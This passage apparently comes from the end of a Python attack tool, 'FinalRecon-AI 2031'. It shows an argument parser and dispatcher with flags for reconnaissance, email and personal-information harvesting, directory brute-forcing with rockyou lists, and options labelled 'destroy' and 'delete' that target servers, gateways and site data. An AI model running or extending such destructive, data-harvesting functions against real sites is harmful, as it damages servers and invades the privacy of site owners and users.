        if getattr(a, 'gws_cleaner', False):
            self.gws_data_cleaner()

        if getattr(a, 'esf_cleaner', False):
            self.esf_data_cleaner()

        if getattr(a, 'all_server_destroy', False):
            self.all_server_destroy()

        if getattr(a, 'cookie_site_delete', False):
            self.cookie_site_data_delete()

        if getattr(a, 'robots_sitemap', False):
            self.scan_robots_sitemap()

        if getattr(a, 'multi_link', False) and getattr(a, 'link', None):
            self.scan_multiple_links(a.link)

        # Cookie Keys
        if getattr(a, 'cookies_key', False):
            self.analyze_cookies_keys()
        if getattr(a, 'cookies_key_clear', False):
            self.clear_cookies_keys()
        if getattr(a, 'website_cookies_clear', False):
            self.clear_website_cookies()
        if getattr(a, 'web_server_cookies_clear', False):
            self.clear_web_server_cookies()

        # 429
        if getattr(a, 'check_429', False):
            self.check_rate_limit_429()

        # Phishing
        if getattr(a, 'phishing_check', False):
            self.check_phishing()

        # Recon
        if getattr(a, 'isp_info', False):
            self.get_isp_info()
        if getattr(a, 'headers', False):
            self.enumerate_headers()
        if getattr(a, 'sslinfo', False):
            self.analyze_ssl_certificate()
        if getattr(a, 'whois', False):
            self.whois_lookup()
        if getattr(a, 'dns', False):
            self.dns_enumeration()
        if getattr(a, 'sub', False):
            self.subdomain_enumeration()
        if getattr(a, 'portscan', False):
            self.port_scan()
        if getattr(a, 'dir', False):
            self.directory_bruteforce()
        if getattr(a, 'crawl', False):
            self.crawl_website()
        if getattr(a, 'vuln', False):
            self.vulnerability_scan()

        # All features
        if getattr(a, 'all_features', False):
            self.run_all_features()

        # 2031 Ultimate
        if getattr(a, 'ultimate_2031', False):
            self.ultimate_2031()

        # Full Ultimate
        if getattr(a, 'full_ultimate', False):
            self.full_ultimate()

        # Full recon
        if getattr(a, 'full', False):
            self.full_recon()

        # AUTO EXPORT
        self.export_results_txt()

        print(Fore.GREEN + "\n" + "=" * 80)
        print(Fore.GREEN + "[+] URL MODE COMPLETED!")
        print(Fore.GREEN + "=" * 80 + "\n")

    def run_all_features(self):
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] RUNNING ALL FEATURES")
        print(Fore.MAGENTA + "=" * 80)

        self.discover_personal_info()
        self.gather_all_info()
        self.detect_gateway()
        self.check_gateway_suspicious_systems()
        self.scan_robots_sitemap()
        self.analyze_cookies_keys()
        self.check_rate_limit_429()
        self.check_phishing()
        self.get_isp_info()
        self.enumerate_headers()
        self.analyze_ssl_certificate()
        self.whois_lookup()
        self.dns_enumeration()
        self.subdomain_enumeration()
        self.port_scan()
        self.directory_bruteforce()
        self.crawl_website()
        self.vulnerability_scan()
        self.detect_technologies()
        self.harvest_emails()
        self.all_data_cleaner()
        self.find_old_data()
        self.find_new_data()
        self.find_backup_files()
        self.find_text_files()
        self.gws_data_cleaner()
        self.esf_data_cleaner()

        print(Fore.MAGENTA + "=" * 80 + "\n")

    def ultimate_2031(self):
        """2031 Ultimate - All features + Destroy + Delete"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] 2031 ULTIMATE - ALL FEATURES + DESTROY + DELETE")
        print(Fore.RED + "=" * 80)

        # All features
        self.run_all_features()

        # Destroy
        self.gateway_destroy()
        self.all_server_destroy()

        # Delete Cookies/Site Data
        self.cookie_site_data_delete()

        if self.rate_limit_429:
            self.destroy_rate_limit_server()

        print(Fore.RED + "=" * 80 + "\n")

    def full_ultimate(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[*] FULL ULTIMATE - ALL FEATURES + DESTROY (WEB SERVER ONLY)")
        print(Fore.RED + "=" * 80)

        self.run_all_features()
        self.gateway_destroy()

        if self.rate_limit_429:
            self.destroy_rate_limit_server()

        print(Fore.RED + "=" * 80 + "\n")

    def full_recon(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] FULL RECONNAISSANCE (WEB SERVER ONLY)")
        print(Fore.CYAN + "=" * 80)
        try:
            self.get_isp_info()
            self.enumerate_headers()
            self.analyze_ssl_certificate()
            self.whois_lookup()
            self.dns_enumeration()
            self.subdomain_enumeration()
            self.port_scan()
            self.directory_bruteforce()
            self.crawl_website()
            self.vulnerability_scan()
            self.check_phishing()
            self.analyze_cookies_keys()
            self.check_rate_limit_429()
            self.detect_technologies()
            self.harvest_emails()

            # 2031 Features
            self.discover_personal_info()
            self.detect_gateway()
            self.check_gateway_suspicious_systems()
            self.scan_robots_sitemap()
            self.all_data_cleaner()
            self.find_old_data()
            self.find_new_data()
            self.find_backup_files()
            self.find_text_files()
            self.gws_data_cleaner()
            self.esf_data_cleaner()

        except Exception as e:
            print(Fore.RED + f"[-] Error in full_recon: {e}")
        print(Fore.CYAN + "=" * 80 + "\n")

    # ============================================
    # ADDITIONAL FUNCTIONS
    # ============================================
    def detect_technologies(self):
        print(Fore.CYAN + "\n[*] TECHNOLOGY DETECTION")
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            html = r.text.lower()
            patterns = {
                'WordPress': [r'wp-content', r'wp-includes'],
                'Joomla': [r'joomla'],
                'Drupal': [r'drupal'],
                'React': [r'react'],
                'Angular': [r'ng-app'],
                'Vue.js': [r'v-model'],
                'jQuery': [r'jquery'],
                'Bootstrap': [r'bootstrap'],
                'PHP': [r'\.php'],
                'Laravel': [r'laravel'],
                'Django': [r'django'],
            }
            for tech, pats in patterns.items():
                for p in pats:
                    if re.search(p, html):
                        print(Fore.GREEN + f"    [+] {tech}")
                        break
        except Exception:
            pass
        print()

    def harvest_emails(self):
        print(Fore.CYAN + "\n[*] EMAIL HARVESTING")
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)))
            filtered = [e for e in emails if not any(x in e.lower() for x in ['example.com', 'test.com'])]
            self.emails = filtered
            if filtered:
                print(Fore.GREEN + f"[+] Found {len(filtered)} email(s):")
                for e in filtered:
                    print(Fore.GREEN + f"    {e}")
        except Exception:
            pass
        print()


# ============================================
# ARGUMENT PARSER - 2031
# ============================================
def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='finalrecon-ai.py',
        description=f"FinalRecon-AI - Web Server Only Edition v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════════════════════════╗
║         FINALRECON-AI 2031 - WEB SERVER ONLY EDITION                        ║
║                      VERSION 2031.0                                         ║
║                                                                              ║
║  ⚠️  WARNING: Use ONLY on your own web server or authorized targets!        ║
║  ⚠️  DESTRUCTIVE OPERATIONS - USE WITH EXTREME CAUTION!                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

📌 BASIC USAGE:
  python3 finalrecon-ai.py --url https://example.com
  python3 finalrecon-ai.py --url https://example.com --full
  python3 finalrecon-ai.py --link https://example.com/ --full
  python3 finalrecon-ai.py --url https://example.com/robots.txt --link https://example.com/sitemap.xml

👤 PERSONAL INFORMATION:
  python3 finalrecon-ai.py --url https://example.com --personal-info

🌐 GATEWAY DETECTION:
  python3 finalrecon-ai.py --url https://example.com --gateway
  python3 finalrecon-ai.py --url https://example.com --gateway-check
  python3 finalrecon-ai.py --url https://example.com --gateway-destroy

🧹 DATA CLEANER:
  python3 finalrecon-ai.py --url https://example.com --data-cleaner
  python3 finalrecon-ai.py --url https://example.com --all-data-cleaner
  python3 finalrecon-ai.py --url https://example.com --old-data
  python3 finalrecon-ai.py --url https://example.com --new-data
  python3 finalrecon-ai.py --url https://example.com --backup-finder
  python3 finalrecon-ai.py --url https://example.com --text-finder

🔷 GWS CLEANER + DELETE:
  python3 finalrecon-ai.py --url https://example.com --gws-cleaner

🔶 ESF CLEANER + DELETE:
  python3 finalrecon-ai.py --url https://example.com --esf-cleaner

💣 ALL SERVER DESTROY:
  python3 finalrecon-ai.py --url https://example.com --all-server-destroy

🍪 COOKIE/SITE DATA DELETE:
  python3 finalrecon-ai.py --url https://example.com --cookie-site-delete

🚀 2031 ULTIMATE (EVERYTHING):
  python3 finalrecon-ai.py --url https://example.com --ultimate-2031

💥 FULL ULTIMATE:
  python3 finalrecon-ai.py --url https://example.com --full-ultimate --rockyou
        """
    )

    tg = parser.add_argument_group('🎯 Target Options')
    tg.add_argument("--url", help="Target URL")
    tg.add_argument("--link", action="append", help="Scan specific link(s)")

    bg = parser.add_argument_group('⚙️  Basic Options')
    bg.add_argument("--port", action="append", type=int, dest="port", help="Custom port")
    bg.add_argument("--isp-info", action="store_true", help="ISP information")
    bg.add_argument("--full", action="store_true", help="Full reconnaissance")
    bg.add_argument("--full-ultimate", action="store_true", dest="full_ultimate",
                    help="Full Ultimate - All features + Destroy")
    bg.add_argument("--ultimate-2031", action="store_true", dest="ultimate_2031",
                    help="2031 Ultimate - ALL features + Destroy + Delete")
    bg.add_argument("-w", "--wordlist", help="Wordlist path")

    pg = parser.add_argument_group('🌐 Web Server Only Features (2031)')
    pg.add_argument("--personal-info", action="store_true", dest="personal_info",
                    help="Discover personal information")
    pg.add_argument("--info", action="store_true", dest="info",
                    help="Gather comprehensive information")
    pg.add_argument("--gateway", action="store_true", dest="gateway",
                    help="Detect web server gateway")
    pg.add_argument("--gateway-check", action="store_true", dest="gateway_check",
                    help="Check gateway suspicious systems")
    pg.add_argument("--gateway-destroy", action="store_true", dest="gateway_destroy",
                    help="Destroy suspicious gateway systems")
    pg.add_argument("--data-cleaner", action="store_true", dest="data_cleaner",
                    help="Basic data cleaner")
    pg.add_argument("--all-data-cleaner", action="store_true", dest="all_data_cleaner",
                    help="Comprehensive data cleaner (ALL files)")
    pg.add_argument("--old-data", action="store_true", dest="old_data",
                    help="Find OLD data files")
    pg.add_argument("--new-data", action="store_true", dest="new_data",
                    help="Find NEW data files")
    pg.add_argument("--backup-finder", action="store_true", dest="backup_finder",
                    help="Find BACKUP files")
    pg.add_argument("--text-finder", action="store_true", dest="text_finder",
                    help="Find TEXT files")
    pg.add_argument("--gws-cleaner", action="store_true", dest="gws_cleaner",
                    help="GWS (Google Web Server) data cleaner + DELETE")
    pg.add_argument("--esf-cleaner", action="store_true", dest="esf_cleaner",
                    help="ESF (Elasticsearch File) data cleaner + DELETE")
    pg.add_argument("--all-server-destroy", action="store_true", dest="all_server_destroy",
                    help="DESTROY all servers (GWS + ESF + Another)")
    pg.add_argument("--cookie-site-delete", action="store_true", dest="cookie_site_delete",
                    help="DELETE all cookies and site data")
    pg.add_argument("--robots-sitemap", action="store_true", dest="robots_sitemap",
                    help="Scan robots.txt and sitemap.xml")
    pg.add_argument("--multi-link", action="store_true", dest="multi_link",
                    help="Scan multiple links")
    pg.add_argument("--all-features", action="store_true", dest="all_features",
                    help="Run all features")

    rg = parser.add_argument_group('🔑 RockYou Wordlist Options')
    rg.add_argument("--rockyou", action="store_true", dest="rockyou",
                    help="Use rockyou.txt wordlist")

    ckg = parser.add_argument_group('🍪 Cookie Key Options')
    ckg.add_argument("--cookies-key", action="store_true", dest="cookies_key",
                     help="Analyze cookie keys")
    ckg.add_argument("--cookies-key-clear", action="store_true", dest="cookies_key_clear",
                     help="Clear cookie keys")
    ckg.add_argument("--website-cookies-clear", action="store_true", dest="website_cookies_clear",
                     help="Clear website cookies")
    ckg.add_argument("--web-server-cookies-clear", action="store_true", dest="web_server_cookies_clear",
                     help="Clear web server cookies")

    r429g = parser.add_argument_group('📊 429 Rate Limit Detection')
    r429g.add_argument("--check-429", action="store_true", dest="check_429",
                       help="Check for HTTP 429 rate limit")

    phg = parser.add_argument_group('🎣 Phishing Detection')
    phg.add_argument("--phishing-check", action="store_true", dest="phishing_check",
                     help="Check for phishing attack")

    rcg = parser.add_argument_group('🔍 Reconnaissance')
    rcg.add_argument("--headers", action="store_true", help="HTTP headers")
    rcg.add_argument("--sslinfo", action="store_true", help="SSL certificate")
    rcg.add_argument("--whois", action="store_true", help="WHOIS lookup")
    rcg.add_argument("--dns", action="store_true", help="DNS enumeration")
    rcg.add_argument("--sub", action="store_true", help="Subdomain enumeration")
    rcg.add_argument("--dir", action="store_true", help="Directory bruteforce")
    rcg.add_argument("--portscan", action="store_true", help="Port scan")
    rcg.add_argument("--crawl", action="store_true", help="Web crawler")
    rcg.add_argument("--vuln", action="store_true", help="Vulnerability scanning")

    og = parser.add_argument_group('📤 Output Options')
    og.add_argument("-nb", "--no-banner", action="store_true", dest="no_banner", help="Hide banner")
    og.add_argument("-version", action="version", version=f"FinalRecon-AI v{VERSION}")

    return parser.parse_args()


# ============================================
# MAIN
# ============================================
def main():
    try:
        args = parse_arguments()

        if args.url or args.link:
            target = args.url if args.url else args.link[0]

            if not args.no_banner:
                bot = AutonomousAIRobot.__new__(AutonomousAIRobot)
                bot.print_banner()

            robot = AutonomousAIRobot(target, args)
            robot.run_url_mode()

            print(Fore.GREEN + "\n[+] Mission Completed Successfully!")
            return 0

        # INTERACTIVE MODE
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "FINALRECON-AI - WEB SERVER ONLY EDITION 2031")
        print(Fore.CYAN + "=" * 60)
        print(Fore.YELLOW + "[*] No target specified. Entering interactive mode...\n")

        url = input(Fore.GREEN + "[?] Enter target URL: " + Fore.RESET).strip()
        if not url:
            print(Fore.RED + "[-] Error: URL required!")
            return 1
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        args.url = url

        full_scan = input(Fore.GREEN + "[?] Full reconnaissance? (y/n, default: y): " + Fore.RESET).strip().lower()
        if full_scan != 'n':
            args.full = True

        time.sleep(1)

        robot = AutonomousAIRobot(args.url, args)
        robot.run_url_mode()

        print(Fore.GREEN + "\n[+] Mission Completed Successfully!")
        return 0

    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Keyboard Interrupt.")
        return 130
    except Exception as e:
        print(Fore.RED + f"\n[-] Fatal Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
